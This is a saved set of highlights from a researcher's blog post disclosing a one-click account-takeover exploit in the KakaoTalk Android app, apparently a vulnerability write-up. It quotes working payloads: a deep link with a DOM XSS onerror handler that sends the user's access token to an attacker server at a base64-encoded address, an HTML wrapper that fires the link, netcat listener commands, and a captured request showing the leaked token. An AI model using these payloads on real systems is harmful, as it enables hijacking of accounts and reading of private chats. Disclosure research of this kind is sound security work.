---
author: "stulle123"
aliases: "1-Click Exploit in South Korea's Biggest Mobile Chat App"
tags: RW_inbox, readwise/articles
url: https://stulle123.github.io/posts/kakaotalk-account-takeover/
date: 2024-09-25
---
# 1-Click Exploit in South Korea's Biggest Mobile Chat App

![rw-book-cover](https://readwise-assets.s3.amazonaws.com/static/images/article2.74d541386bbf.png)

## Highlights


A deep link validation issue in KakaoTalk `10.4.3` allows a remote adversary to run arbitrary JavaScript in a WebView that leaks an access token in a HTTP request header. Ultimately, this token can be used to takeover another user’s account and read her/his chat messages by registering an attacker-controlled device.
> [View Highlight](https://read.readwise.io/read/01j8n4mz62qwf3ryhj479s3y1a)


Entry Point: CommerceBuyActivity[#](https://stulle123.github.io/posts/kakaotalk-account-takeover#entry-point-commercebuyactivity)
 The `CommerceBuyActivity` WebView is the main entry point and very interesting from an attacker’s point of view:
 • It’s exported and can be started with a deep link (e.g., `adb shell am start kakaotalk://buy`)
 • It has JavaScript enabled (`settings.setJavaScriptEnabled(true);`)
 • It supports the `intent://` [scheme](https://www.mbsd.jp/Whitepaper/IntentScheme.pdf) to send data to other **non-exported** app components via JavaScript. For example, the URI `"intent:#Intent;component=com.kakao.talk/.activity.setting.MyProfileSettingsActivity;S.EXTRA_URL=https://foo.bar;end"` loads the website `https://foo.bar` in the `MyProfileSettingsActivity` WebView.
 • There’s no sanitization of `intent://` URIs (e.g., the `Component` or `Selector` is **not** set to `null`). So, potentially any app component can be accessed.
> [View Highlight](https://read.readwise.io/read/01j8nkgas0abmddpc62wn93ms3)



URL Redirect to DOM XSS[#](https://stulle123.github.io/posts/kakaotalk-account-takeover#url-redirect-to-dom-xss)
 While digging into `https://buy.kakao.com` we identified the endpoint `https://buy.kakao.com/auth/0/cleanFrontRedirect?returnUrl=` which allowed to redirect to any `kakao.com` domain. This vastly increased our chances to find a XSS flaw as there are many many subdomains under `kakao.com`.
> [View Highlight](https://read.readwise.io/read/01j8nkjzyawkepkdm5sq6fjwh0)



At this point we could run arbitrary JavaScript in the `CommerceBuyActivity` WebView when the user clicked on a deep link such as `kakaotalk://auth/0/cleanFrontRedirect?returnUrl=https://m.shoppinghow.kakao.com/m/product/Y25001977964/q:"><img src=x onerror=alert(1);>`.
> [View Highlight](https://read.readwise.io/read/01j8nkmmkw5wxbb1v05d8s5ysf)



Deep Link to Kakao Mail Account Takeover[#](https://stulle123.github.io/posts/kakaotalk-account-takeover#deep-link-to-kakao-mail-account-takeover)
 As explained in the previous section, we can steal the user’s access token by running arbitrary JS in the `CommerceBuyActivity` WebView. By crafting a malicious deep link, we could send the token to an attacker-controlled server:
 copy
 1
 kakaotalk://buy/auth/0/cleanFrontRedirect?returnUrl=https://m.shoppinghow.kakao.com/m/product/Q24620753380/q:"><img src=x onerror="document.location=atob('aHR0cDovLzE5Mi4xNjguMTc4LjIwOjU1NTUv');">
> [View Highlight](https://read.readwise.io/read/01j8nkqsqfameapjdhzs5v699j)



PoC[#](https://stulle123.github.io/posts/kakaotalk-account-takeover#poc)
 The goal of the PoC is to register [KakaoTalk for Windows/MacOS](https://www.kakaocorp.com/page/service/service/KakaoTalk?lang=en) or the open-source client [KiwiTalk](https://github.com/KiwiTalk/KiwiTalk) to a victim’s account to read her/his **non-end-to-end** encrypted chat messages.
 The steps for an attacker are as follows:
 Attacker prepares the malicious deep link[#](https://stulle123.github.io/posts/kakaotalk-account-takeover#attacker-prepares-the-malicious-deep-link)
 First, she/he stores the payload to a file, …
 copy
 1
 2
 3
 <script>
 location.href = decodeURIComponent("kakaotalk%3A%2F%2Fbuy%2Fauth%2F0%2FcleanFrontRedirect%3FreturnUrl%3Dhttps%3A%2F%2Fm.shoppinghow.kakao.com%2Fm%2Fproduct%2FQ24620753380%2Fq%3A%22%3E%3Cimg%20src%3Dx%20onerror%3D%22document.location%3Datob%28%27aHR0cDovLzE5Mi4xNjguMTc4LjIwOjU1NTUv%27%29%3B%22%3E");
 </script>
 … starts the HTTP server and …
 copy
 1
 $ python3 -m http.server 8888
 … opens a Netcat listener in another terminal window: `$ nc -l 5555`. Easy ;-)
 Victim clicks the link and leaks an access token to the attacker[#](https://stulle123.github.io/posts/kakaotalk-account-takeover#victim-clicks-the-link-and-leaks-an-access-token-to-the-attacker)
 Next, the attacker sends a URL (e.g., `http://192.168.178.20:8888/foo.html`) and waits until the victim clicks it. The access token should be then leaked in the Netcat listener:
 copy
 1
 2
 3
 4
 5
 6
 7
 8
 9
 10
 11
 12
 13
 GET /foo.html HTTP/1.1
 Host: 192.168.178.20:5555
 Connection: keep-alive
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Linux; Android 10; M2004J19C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/119.0.6045.66 Mobile Safari/537.36;KAKAOTALK 2610420;KAKAOTALK 10.4.2
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
 authorization: 64f03846070b4a9ea8d8798ce14220ce00000017017793161400011gzCIqV_7kN-deea3b5dc9cddb9d8345d95438207fc0981c2de80188082d9f6a8849db8ea92e
 os_name: Android
 kakao-buy-version: 1.0
 os_version: 10.4.2
 X-Requested-With: com.kakao.talk
 Accept-Encoding: gzip, deflate
 Accept-Language: en-US,en;q=0.9
 Attacker uses the access token to reset the victim’s password[#](https://stulle123.github.io/posts/kakaotalk-account-takeover#attacker-uses-the-access-token-to-reset-the-victims-password)
 Next, the attacker can now reset her/his KakaoTalk password (see instructions [above](https://stulle123.github.io/posts/kakaotalk-account-takeover#kakaotalk-password-reset-with-burp)).
 Attacker registers her/his device the victim’s KakaoTalk account
> [View Highlight](https://read.readwise.io/read/01j8nkt0avzd66j4keaz18wn7z)

